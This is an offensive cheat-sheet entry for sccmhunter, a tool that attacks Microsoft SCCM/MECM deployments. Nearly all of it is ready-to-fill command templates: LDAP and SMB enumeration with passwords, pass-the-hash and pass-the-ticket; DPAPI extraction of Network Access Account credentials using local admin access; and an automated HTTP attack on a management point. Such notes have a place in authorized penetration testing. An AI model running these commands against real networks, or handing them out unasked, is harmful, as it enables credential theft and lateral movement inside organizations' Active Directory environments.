# sccmhunter

% sccm, mecm
#plateform/linux  #target/remote  #cat/ATTACK 

## desc
```
https://github.com/garrettfoster13/sccmhunter
https://github.com/garrettfoster13/sccmhunter/wiki

.sccmhunter/logs/db/find.db
to install set dependencies on last version (i.e remove version in requirements.txt)

```

##  enum - ldap (creds)
```bash
python3 sccmhunter.py find -debug  -u <user> -p <password> -d <domain_fqdn> -dc-ip <dc_fqdn>
```

##  enum - ldap (pth)
```bash
python3 sccmhunter.py find -debug  -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn>
```

##  enum - ldap (ptt)
```bash
KRB5CCNAME=<ccache>  python3 sccmhunter.py find -debug  -u <user> -no-pass -k -d <domain_fqdn> -dc-ip <dc_fqdn>
```

## enum - smb (creds)
```bash
python3 sccmhunter.py smb -debug  -u <user> -p <password> -d <domain_fqdn> -dc-ip <dc_fqdn>
```

## show - all
```bash
python3 sccmhunter.py show  -all
```

## DPAPI - naa (cred local admin)
```bash
python3 sccmhunter.py dpapi -debug  -u <user>  -p '<password>' -target <target_ip>
```


## DPAPI - naa (pth local admin)
```bash
python3 sccmhunter.py dpapi -debug  -u <user>  -hashes :<nt_hash> -target <target_ip>
```

## http - 
```bash
python3 sccmhunter.py http -debug  -u <user> -p '<password>' -d <domain_fqdn> -mp <sccm_fqdn> -dc-ip <dc_fqdn> -sleep <sleep|10> -auto
```